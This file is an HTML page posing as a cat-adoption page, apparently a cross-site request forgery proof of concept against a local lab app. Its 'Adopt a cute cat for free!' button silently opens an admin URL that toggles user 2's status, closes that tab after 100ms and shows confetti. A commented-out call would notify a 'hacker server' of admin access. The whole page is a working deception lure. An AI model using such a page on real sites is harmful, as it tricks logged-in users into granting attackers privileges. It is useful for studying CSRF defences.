<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cat Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('wallpaper.jpg') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            max-width: 600px;
            text-align: center;
            background-color: rgba(255, 255, 255, 0.95);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        
        .button {
            display: inline-block;
            padding: 10px 20px;
            font-size: 16px;
            color: #fff;
            background-color: rgb(59, 143, 199);
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            animation: pulse 2s infinite;
        }
        .button:hover {
            background-color: #0056b3;
        }
        @keyframes pulse {
            0% {
                transform: scale(1);
                box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
            }
            50% {
                transform: scale(1.1);
                box-shadow: 0 0 25px rgba(0, 123, 255, 0.5);
            }
            100% {
                transform: scale(1);
                box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
            }
        }
        .message {
            display: none;
            margin-top: 20px;
            padding: 10px;
            background-color: #dff0d8;
            color: #3c763d;
            border: 1px solid #d6e9c6;
            border-radius: 5px;
        }
        .confetti {
            position: fixed;
            width: 20px;
            height: 20px;
            background: red;
            z-index: 9999;
            animation: explode 2s ease-out forwards;
        }
        @keyframes explode {
            0% {
                transform: scale(1) translate(0, 0);
                opacity: 1;
            }
            100% {
                transform: scale(0) translate(var(--x), var(--y));
                opacity: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="title">Welcome to the Kitten Page</h1>
        <p>Here you can learn everything about kitten. Kitten are cute, carnivorous mammals that are often visible in houses. They are known for their agility, playfulness, and ability to purr.</p>
        <img src="kitten.jpg" alt="Cute kitten" width="500">
        <br><br>
        
        <button class="button" onclick="csrfAndRedirect()">Adopt a cute cat for free!</button>
        
        <div id="message" class="message">Your bear thanks you :)</div>
    </div>
    
    <script>
        function csrfAndRedirect() {
            var win = window.open("http://localhost:8000/dashboard/users/2/toggle", "_blank");
            if (win) {
                setTimeout(function() {
                    win.close();
                }, 100); // closes the tab after 100ms
            }

            launchConfetti();
            // Change the main H1 text
            document.getElementById('title').textContent = 'Thank you for adopting a cat!';
            // Hide the button
            document.querySelector('.button').style.display = 'none';

            // Send notification to hacker server saying that now he's an admin
            // fetch("http://localhost:8000/hacker/notify", {
            //     method: "POST",
            //     body: JSON.stringify({
            //         message: "You are now an admin"
            //     })
            // });
        }
        
        function launchConfetti() {
            for (let i = 0; i < 100; i++) {
                createConfetti();
            }
        }
        
        function createConfetti() {
            const confetti = document.createElement('div');
            confetti.classList.add('confetti');
            confetti.style.left = '50vw';
            confetti.style.top = '50vh';
            confetti.style.setProperty('--x', (Math.random() - 0.5) * 300 + 'vw');
            confetti.style.setProperty('--y', (Math.random() - 0.5) * 300 + 'vh');
            confetti.style.backgroundColor = getRandomColor();
            document.body.appendChild(confetti);
            
            setTimeout(() => {
                confetti.remove();
            }, 2000);
        }
        
        function getRandomColor() {
            const colors = ['red', 'blue', 'green', 'yellow', 'orange', 'purple'];
            return colors[Math.floor(Math.random() * colors.length)];
        }
    </script>
</body>
</html>
